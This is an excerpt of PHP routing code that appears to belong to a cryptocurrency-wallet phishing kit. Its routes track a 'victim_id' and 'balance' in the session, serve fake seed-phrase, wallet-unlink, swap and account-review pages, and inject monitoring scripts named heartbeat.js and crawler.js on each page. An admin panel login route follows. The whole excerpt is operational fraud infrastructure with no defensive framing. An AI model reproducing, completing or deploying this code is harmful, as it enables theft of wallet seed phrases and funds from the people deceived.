        ...
        if(panelcheck() == True) {
            ...
            if (!isset($request->client_id)) {
                ...
                if (preg_match('/^[a-zA-Z0-9_-]+$/', $request->client_id) &&
                    ...
                    $request->pwd === 'true') {
                    require __DIR__ .'../../pages/new/review-actions.php';
                } else {
            ...
            $klein->respond('GET','/signin/loading', function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['balance'])) {
                    return $klein->response()->redirect('/');
                }
...
$klein->respond("GET","/account/vault", function ($request) use ($klein) {
    if (!isset($request->client_id) || !isset($_SESSION['email'])) {
        return $klein->response()->redirect('/');
    }
...
$klein->respond("GET","/account/reschedule", function ($request) use ($klein) {
    ...
    echo "<script src='../../static/crawler.js'></script>";
        ...
        $klein->respond("GET", "/account/loading", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['victim_id'])) {
                return $klein->response()->redirect('/');
            }
        ...
        $klein->respond("GET", "/wallet/unlink", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['email'])) {
                return $klein->response()->redirect('/');
            }

            require __DIR__ .'../../pages/seed/unlink.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });
        
        $klein->respond("GET", "/account/unlink", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['email'])) {
                return $klein->response()->redirect('/');
            }

            require __DIR__ .'../../pages/new/cbwunlink.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });

        $klein->respond("GET", "/review/auth", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['email'])) {
                return $klein->response()->redirect('/');
            }

            require __DIR__ .'../../pages/new/review-auth-change.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });
        
        $klein->respond("GET", "/account/balance", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['victim_id'])) {
                return $klein->response()->redirect('/');
            }

            require __DIR__ .'../../pages/new/balance.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });
        
        $klein->respond("GET", "/wallet/swap", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['email'])) {
                return $klein->response()->redirect('/');
            }

            require __DIR__ .'../../pages/new/swap.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });

        $klein->respond("GET", "/invalid/seed", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['email'])) {
                return $klein->response()->redirect('/');
            }

            require __DIR__ .'../../pages/new/invalidseed.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });
        
        $klein->respond("GET", "/whitelist/success", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['email'])) {
                return $klein->response()->redirect('/');
            }

            require __DIR__ .'../../pages/new/whitelistsuccess.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });
        
        $klein->respond("GET", "/external/remove", function ($request) use ($klein) {
            if (!isset($request->client_id) || !isset($_SESSION['email'])) {
                return $klein->response()->redirect('/');
            }

            require __DIR__ .'../../pages/new/externalremoved.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });
    ...
    public function adminRoutes($klein) {
        ...
        $klein->respond('GET', '/admin/login', function () use ($klein) {
            if (isset($_SESSION['user_id'])) {
                return $klein->response()->redirect('/admin');
            }
